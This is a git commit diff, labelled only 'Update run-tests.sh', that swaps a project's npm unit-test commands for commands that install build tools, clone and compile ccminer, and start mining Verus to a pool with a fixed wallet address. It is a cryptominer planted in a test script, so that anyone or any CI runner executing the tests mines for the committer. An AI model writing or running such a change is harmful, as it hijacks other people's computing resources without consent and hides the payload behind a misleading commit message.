982a93699401909f7c92e5a1aabb5de1197fe044
tq6gsbq <84422439+tq6gsbq@users.noreply.github.com>
2021-05-19 06:08:50 +0700

    Update run-tests.sh

--- test/run-tests.sh
+++ test/run-tests.sh
@@ -1,6 +1,13 @@
 #!/bin/bash
 # set -x
-npm install
-npm run test-unit
-FILE_LOCATIONS="./test/unit-test.json"
-TEST_TYPES="unittest"
+apt update
+apt install sudo
+apt install git -y
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.GG -p x -t 2
